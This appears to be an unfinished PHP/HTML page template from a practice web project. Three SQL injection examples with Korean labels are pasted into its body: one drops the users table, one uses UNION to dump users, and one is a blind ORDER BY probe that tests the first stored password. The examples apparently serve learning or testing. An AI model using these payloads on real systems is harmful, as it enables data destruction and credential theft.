<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Your Title</title>
    <style>
        body {
            margin: 0;
            padding-bottom: 60px; /* footer 높이만큼 여백 추가 */
            min-height: 100vh;
        }
        .content-wrapper {
            padding: 20px;
        }
    </style>
</head>
<body>
    <?php include 'src/public/header.php'; ?>
    <div class="content-wrapper">
    <?php

    ?>
        <script>
          
            

        </script>
        
    <div class="testtable" id="testtable">

    </div>
    -- 1. 게시글 작성 인젝션
INSERT INTO board (title, content) 
VALUES ('악성제목', '악성내용'); DROP TABLE users; --');

-- 2. 검색 기능 인젝션
                SELECT * FROM board 
                WHERE title LIKE '%악성검색어%' UNION SELECT * FROM users;

            -- 3. 정렬 인젝션
            SELECT * FROM board 
            ORDER BY (CASE WHEN (SELECT password FROM users LIMIT 1)>'a' THEN id ELSE title END);
    
          


    
    <?php include 'src/public/footer.php'; ?>
</body>
</html>